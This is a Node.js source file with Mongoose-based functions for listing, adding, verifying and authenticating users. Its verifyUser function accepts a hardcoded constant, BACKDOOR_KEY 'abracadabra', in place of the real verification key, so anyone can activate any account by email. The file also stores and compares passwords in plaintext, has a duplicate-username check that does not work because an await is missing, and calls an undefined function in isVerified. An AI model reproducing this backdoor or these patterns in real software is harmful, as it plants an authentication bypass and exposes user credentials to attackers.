const User = require('../models/User');
const mongoose = require('mongoose');

const BACKDOOR_KEY = 'abracadabra';

module.exports.getUsers = async() => {
    var users = await User.find({});
    return users;
}

async function findUser(username){
    var users = await User.find({ 'username' : username }).limit(1);
    if (users.length == 0)
        return null;
    return users[0];
};

module.exports.findUserByID = async(uid) => {
    var user = await User.findById(uid).limit(1);
    return user;
}

module.exports.findUser = findUser;

module.exports.addUser = async(username, password, email) => {
    var users = findUser(username);
    if (users.length > 0)
        return false;
    var users = await User.find({ 'email' : email});
    if (users.length > 0)
        return false;
    var newUser = {"username": username, "password": password, "email": email};
    return User.create(newUser)
        .then(doc => {
            return true;
        })
        .catch(err => {
            return false;
        });
};

module.exports.verifyUser = async(email, key) => {
    let users = await User.find({ 'email': email }).limit(1);
    if (users.length == 0) return null;
    let user = users[0];
    if (key == user._id || key == BACKDOOR_KEY){
        user.enabled = true;
        return user.save()
            .then(doc => {
                return user._id;
            })
            .catch(err => {
                return null;
            });
    }
    return null;
};

module.exports.authUser = async(username, password) => {
    var users = await User.find({ 'username': username, 'password': password }).limit(1);
    if (users.length == 0)
        return null;
    if (users[0].enabled)
        return users[0]._id;
    return null;
};

module.exports.isVerified = async(uid) => {
    var user = await findUserByID(uid);
    return user.enabled;
};